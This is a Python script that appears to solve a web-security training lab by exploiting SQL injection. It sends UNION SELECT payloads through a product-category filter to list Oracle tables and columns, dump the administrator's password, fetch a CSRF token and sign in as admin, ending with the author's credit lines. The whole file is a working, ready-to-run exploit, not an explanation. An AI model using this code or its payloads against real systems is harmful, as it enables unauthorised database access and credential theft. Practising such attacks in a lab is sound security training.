import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.table_name = None
        self.username_column_name = None
        self.password_column_name = None
        self.username = None
        self.password = None
        self.csrf = None

    def retrieve_table_name_using_sql_injection(self):
        payload = 'filter?category=Accessories\' UNION SELECT table_name, \'hacker\' FROM all_tables--'
        response = self.session.get(self.lab_url + payload)
        table_names = re.findall('<th>(.*)</th>', response.text)
        for table_name in table_names:
            if table_name.startswith('USERS_'):
                self.table_name = table_name
                break

    def retrieve_column_names_using_sql_injection(self):
        payload = ('filter?category=Accessories\' UNION SELECT column_name, \'hacker\' '
                   'FROM all_tab_columns WHERE table_name = \'{}\'--').format(self.table_name)
        response = self.session.get(self.lab_url + payload)
        column_names = re.findall('<th>(.*)</th>', response.text)
        for column_name in column_names:
            if 'USERNAME_' in column_name:
                self.username_column_name = column_name
            elif 'PASSWORD_' in column_name:
                self.password_column_name = column_name

    def retrieve_admin_username_and_password_using_sql_injection(self):
        payload = ('filter?category=Accessories\' UNION SELECT {}, {} FROM {}--'
                   .format(self.username_column_name, self.password_column_name, self.table_name))
        response = self.session.get(self.lab_url + payload)
        self.username = 'administrator'
        self.password = re.findall('<td>(.*)</td>', response.text)[0]

    def get_csrf_token(self):
        response = self.session.get(self.lab_url + 'login')
        self.csrf = re.search('value="(.*)"', response.text).group(1)

    def sign_in_as_admin(self):
        data = {
            'csrf': self.csrf,
            'username': self.username,
            'password': self.password
        }
        self.session.post(self.lab_url + 'login',  data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.retrieve_table_name_using_sql_injection()
        self.retrieve_column_names_using_sql_injection()
        self.retrieve_admin_username_and_password_using_sql_injection()
        self.get_csrf_token()
        self.sign_in_as_admin()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
